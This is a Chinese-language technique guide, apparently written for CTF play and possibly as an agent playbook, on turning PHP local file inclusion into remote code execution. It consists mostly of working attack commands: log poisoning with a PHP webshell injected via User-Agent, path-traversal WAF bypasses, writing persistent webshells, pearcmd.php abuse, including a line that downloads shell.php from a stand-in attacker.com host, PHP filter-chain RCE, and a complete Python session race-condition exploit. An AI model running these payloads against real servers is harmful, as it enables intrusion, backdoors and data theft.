# LFI → RCE 技术详解

## 日志投毒 (Log Poisoning) — 最常用

### 完整攻击链（必须严格按顺序执行并验证每一步）

**Step 1: 确认 LFI 能读取日志文件**
```bash
# 用 curl 测试，不要用 browser！逐个尝试日志路径
curl -s "http://target/vuln.php?file=../../../../../../var/log/nginx/access.log" | head -5
curl -s "http://target/vuln.php?file=../../../../../../var/log/apache2/access.log" | head -5
# 如果有 WAF/过滤，用已知的 bypass（如 ....// 双写）
curl -s "http://target/vuln.php?file=....//....//....//....//....//var/log/nginx/access.log" | head -5
```
**验证**: 响应中应包含类似 `GET /xxx HTTP/1.1` 的访问日志行。如果为空或报错 → 换路径。

**Step 2: 注入 PHP payload 到 User-Agent**
```bash
# 用 curl 发请求，User-Agent 设为 PHP 代码
# 注意：一次注入失败（语法错误）会污染日志，后续所有 include 都报错！
# 所以 payload 必须一次正确
curl -s "http://target/" -H "User-Agent: <?php echo shell_exec(\$_GET['cmd']); ?>"
```
**⚠️ 关键**: shell 中 `$` 必须转义为 `\$`，否则 bash 会展开变量导致 payload 损坏。

**Step 3: 验证注入 — 通过 LFI 执行命令**
```bash
# 用 LFI 包含日志文件 + cmd 参数执行命令
curl -s "http://target/vuln.php?file=....//....//....//....//var/log/nginx/access.log&cmd=id"
```
**验证**: 响应中应包含 `uid=33(www-data)` 之类的输出。

**Step 4: 如果 Step 3 成功 → 立即读 flag + 写持久 webshell**
```bash
# 读 flag
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=find+/+-name+'flag*'+-o+-name+'FLAG*'+2>/dev/null"
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=cat+/flag.txt"
# 写持久 webshell（不再依赖日志）
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log&cmd=echo+'<?php+system(\$_GET[c]);?>'+>+/var/www/html/s.php"
# 验证 webshell
curl -s "http://target/s.php?c=id"
```

### 常见失败原因与排查

| 症状 | 原因 | 解决 |
|------|------|------|
| LFI 返回空/200 Content-Length:0 | PHP payload 语法错误，include 时解析失败 | payload 已污染日志，换日志文件（error.log）或用其他 LFI→RCE 方法 |
| `$_GET` 变成空 | bash 没转义 `$` | 用 `\$_GET` 或单引号包裹 |
| 日志文件找不到 | 路径不对 | 遍历: nginx/access.log, apache2/access.log, httpd/access_log |
| 能读日志但注入后无输出 | disable_functions 禁了 system/exec | 用 `file_get_contents()` 读文件，或用 mail()+LD_PRELOAD bypass |
| 注入成功但目录遍历被拦 | WAF 拦截 `../` | 用 `....//`, `..%2f`, URL双编码 |

### 直接读 flag 的 payload（不走 webshell）
```bash
# 如果只需要读 flag 不需要 RCE：
curl -s "http://target/" -H "User-Agent: <?php echo file_get_contents('/flag.txt'); ?>"
curl -s "http://target/vuln.php?file=....//....//var/log/nginx/access.log"
# 响应中搜索 flag{ 即可
```

**⚠️ 关键陷阱（必读）：**
- **绝对不要用 `system('cat /file.php')`！** `cat` 输出的 `<?php ... ?>` 在 PHP 解析上下文中会被再次解析 → 语法错误 → 输出为空
- **必须用 `file_get_contents('/FLAG.php')` + `echo`** — 读取为原始字符串，不经二次解析
- HTTP 200 但 **Content-Length: 0** → PHP 代码产生了语法错误
- **一旦注入了错误 payload，该日志文件就废了** — 每次 include 都会尝试解析错误的 PHP，导致整个页面出错

**日志文件常见路径**: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/access_log`, `/var/log/nginx/error.log`, `/var/log/apache2/error.log`

**Payload 模板（按优先级）：**
```
Webshell（首选）: <?php echo shell_exec($_GET['cmd']); ?>
读取 flag: <?php echo file_get_contents('/flag.txt'); ?>
系统命令: <?php echo shell_exec('ls /'); ?>
```

## PHP Wrapper
- `php://input` + POST body 含 PHP 代码
- `data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL0ZMQUcucGhwJyk7Pz4=`
- `expect://id`（需 expect 扩展）
- **注意**: `file_exists()` 对 PHP stream wrapper 返回 false！如果目标先 `file_exists()` 再 `include()`，wrapper 不可用，必须用日志投毒

## Session 文件包含（无需外部服务器！）

**步骤 1**: 找到把用户输入存入 session 的功能
```
http_request url="http://target/login.php" method="POST" body="username=<?php echo file_get_contents('/flag.txt'); ?>&password=test"
```

**步骤 2**: 获取 PHPSESSID（从 Set-Cookie 头）

**步骤 3**: 包含 session 文件
```
?file=../../../../tmp/sess_abc123def456
```

**Session 文件路径**：`/tmp/sess_<ID>`, `/var/lib/php/sessions/sess_<ID>`, `/var/lib/php5/sess_<ID>`

## pearcmd.php 利用（PHP 环境通杀）

**原理**：`pearcmd.php`（PHP PEAR 包管理器）自带文件写入功能，无需额外条件。

**条件**：
- 存在 LFI 漏洞
- PHP 安装了 PEAR（Docker PHP 镜像默认包含）
- `register_argc_argv=On`（Docker PHP 默认开启）

```bash
# Step 1: 利用 pearcmd 的 config-create 命令写入 webshell
# 核心：通过 URL 参数传入 PEAR 命令行参数
curl 'http://target/vuln.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1]);?>+/tmp/shell.php'

# Step 2: 包含写入的 shell
curl 'http://target/vuln.php?file=/tmp/shell.php&1=cat+/flag.txt'
```

**变体（不同 pearcmd 路径）**：
```
/usr/local/lib/php/pearcmd.php    ← Docker PHP 最常见
/usr/share/php/pearcmd.php        ← Debian/Ubuntu
/usr/lib/php/pearcmd.php
```

**变体（install 命令下载远程文件）**：
```bash
curl 'http://target/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://attacker.com/shell.php'
```

---

## PHP Filter Chain RCE（无文件写入 LFI→RCE）

**原理**：通过链式嵌套 `php://filter` 的 `convert.iconv` 转换，不写入任何文件，直接在 `include()` 时生成任意 PHP 代码。

**条件**：
- 存在 LFI 且通过 `include()` 包含
- 不依赖文件写入、不依赖日志、不依赖 session

**工具**：`php_filter_chain_generator.py`

```bash
# 安装工具
git clone https://github.com/synacktiv/php_filter_chain_generator.git

# 生成执行 id 命令的 filter chain
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
# 输出一个很长的 php://filter/... 字符串

# 使用：将生成的 chain 作为 LFI 的参数值
curl 'http://target/vuln.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...|/resource=php://temp'
```

**手动构造（短 payload）**：
```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp
```

---

## Session 文件包含条件竞争（无需用户功能）

**原理**：PHP 默认对每个 PHPSESSID 创建 session 文件。如果 `session.upload_progress.enabled=On`（默认开启），上传文件时 PHP 会将上传进度写入 session 文件，其中包含用户可控的文件名。

**条件**：
- `session.upload_progress.enabled = On`（PHP 默认开启）
- `session.upload_progress.cleanup = On`（默认开启，上传完毕后清除 → 需要竞争）

**利用（条件竞争）**：

```python
#!/usr/bin/env python3
"""Session upload progress race condition → LFI to RCE"""
import requests
import threading

TARGET = 'http://target/vuln.php'
SESS_ID = 'race_session_test'
PAYLOAD = '<?php system("cat /flag.txt"); ?>'

# session 文件路径（按顺序尝试）
SESS_PATHS = [
    f'/tmp/sess_{SESS_ID}',
    f'/var/lib/php/sessions/sess_{SESS_ID}',
    f'/var/lib/php5/sess_{SESS_ID}',
]

def upload():
    """持续上传文件，让 PHP 在 session 中写入包含 payload 的文件名"""
    while True:
        requests.post(
            TARGET,
            files={'file': (PAYLOAD, 'x')},  # 文件名=payload
            data={'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD},
            cookies={'PHPSESSID': SESS_ID},
        )

def include_session():
    """持续尝试包含 session 文件"""
    for path in SESS_PATHS:
        for _ in range(200):
            r = requests.get(f'{TARGET}?file={path}', cookies={'PHPSESSID': SESS_ID})
            if 'flag{' in r.text or len(r.text) > 100:
                print(f'[+] SUCCESS: {r.text}')
                return True
    return False

# 启动上传线程
for _ in range(5):
    threading.Thread(target=upload, daemon=True).start()

# 尝试包含
include_session()
```

---

## /proc/self/fd 暴力
遍历 `/proc/self/fd/0` 到 `/proc/self/fd/255`

## 直接包含 .php 文件的陷阱

**当 LFI 通过 `include()` 包含 .php 文件时：**
- PHP 引擎会**执行**该文件，而非显示源码
- flag 在 `<?php flag{...} ?>` 中 → `include()` 尝试解析 → 语法错误 → 空输出
- `error_reporting(0)` 下错误被静默吞掉，返回 HTTP 200 + Content-Length: 0
- **解决方案**: 用日志投毒获得 RCE，再用 `file_get_contents()` 读取
